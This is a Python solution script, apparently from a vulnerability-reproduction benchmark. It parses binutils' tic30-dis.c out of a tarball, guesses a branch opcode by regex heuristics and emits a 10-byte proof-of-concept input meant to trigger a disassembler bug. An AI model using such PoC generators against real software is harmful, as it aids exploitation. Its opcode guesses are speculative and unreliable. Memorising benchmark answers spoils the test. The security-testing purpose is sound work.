import tarfile
import re
import struct


class Solution:
    def solve(self, src_path: str) -> bytes:
        def strip_c_comments(code: str) -> str:
            code = re.sub(r'/\*[\s\S]*?\*/', '', code)
            code = re.sub(r'//.*', '', code)
            return code

        def find_innermost_brace_block(chunk: str, local_idx: int):
            opens = []
            pairs = []
            for i, ch in enumerate(chunk):
                if ch == '{':
                    opens.append(i)
                elif ch == '}':
                    if opens:
                        left = opens.pop()
                        pairs.append((left, i))
            # Find smallest block containing local_idx
            best = None
            for l, r in pairs:
                if l <= local_idx <= r:
                    if best is None or (r - l) < (best[1] - best[0]):
                        best = (l, r)
            if best:
                return chunk[best[0]:best[1] + 1]
            return None

        def extract_branch_insn(code: str):
            # Heuristic 1: look for table entries containing 'print_branch' (not a function call/definition)
            for m in re.finditer(r'\bprint_branch\b', code):
                # ensure not followed by '(' (function call/def)
                j = m.end()
                while j < len(code) and code[j].isspace():
                    j += 1
                if j < len(code) and code[j] == '(':
                    continue  # likely a function definition/call
                # consider around this occurrence
                start = max(0, m.start() - 8000)
                end = min(len(code), m.end() + 8000)
                chunk = code[start:end]
                local_idx = m.start() - start
                block = find_innermost_brace_block(chunk, local_idx)
                if not block:
                    continue
                hexes = re.findall(r'0x[0-9a-fA-F]+', block)
                cand_value = None
                best_score = None
                # Try to deduce mask/value pairs where value & ~mask == 0
                for i in range(len(hexes)):
                    for j in range(len(hexes)):
                        if i == j:
                            continue
                        a = int(hexes[i], 16)
                        b = int(hexes[j], 16)
                        # Assume a is mask, b is value
                        if a != 0 and (b & ~a) == 0:
                            score = (bin(a & 0xFFFFFFFF).count('1'), -i, -j)
                            if best_score is None or score > best_score:
                                best_score = score
                                cand_value = b & 0xFFFFFFFF
                if cand_value is not None:
                    return cand_value
                # Heuristic 2: look for (x & MASK) == VALUE patterns near the block
                patt = re.compile(r'&\s*(0x[0-9a-fA-F]+)\s*\)\s*==\s*(0x[0-9a-fA-F]+)')
                ms = list(patt.finditer(chunk))
                if ms:
                    mask_str, val_str = ms[-1].groups()
                    mask = int(mask_str, 16)
                    val = int(val_str, 16)
                    if (val & ~mask) == 0:
                        return val & 0xFFFFFFFF
            return None

        # Read tic30-dis.c from the tarball
        tic30_code = None
        try:
            with tarfile.open(src_path, 'r:*') as tf:
                members = tf.getmembers()
                # Prefer paths under opcodes/ with tic30-dis.c
                candidate = None
                for m in members:
                    if not m.isfile():
                        continue
                    name_low = m.name.lower()
                    if name_low.endswith('opcodes/tic30-dis.c') or name_low.endswith('opcodes/tic30_dis.c'):
                        candidate = m
                        break
                if candidate is None:
                    # fallback: any file ending with tic30-dis.c
                    for m in members:
                        if not m.isfile():
                            continue
                        name_low = m.name.lower()
                        if name_low.endswith('tic30-dis.c') or name_low.endswith('tic30_dis.c'):
                            candidate = m
                            break
                if candidate is not None:
                    f = tf.extractfile(candidate)
                    if f is not None:
                        tic30_code = f.read().decode('latin-1', errors='ignore')
        except Exception:
            tic30_code = None

        insn = None
        if tic30_code:
            code_wo_comments = strip_c_comments(tic30_code)
            insn = extract_branch_insn(code_wo_comments)

        if insn is None:
            # Fallback speculative branch-like opcode constant
            # These values are chosen heuristically; they are common patterns for opcode-high-nibble matches
            insn = 0x20000000

        # Build PoC: include both endian variants to increase chances; total 10 bytes
        le = struct.pack('<I', insn & 0xFFFFFFFF)
        be = struct.pack('>I', insn & 0xFFFFFFFF)
        poc = le + be + b'\x00\x00'
        return poc[:10]
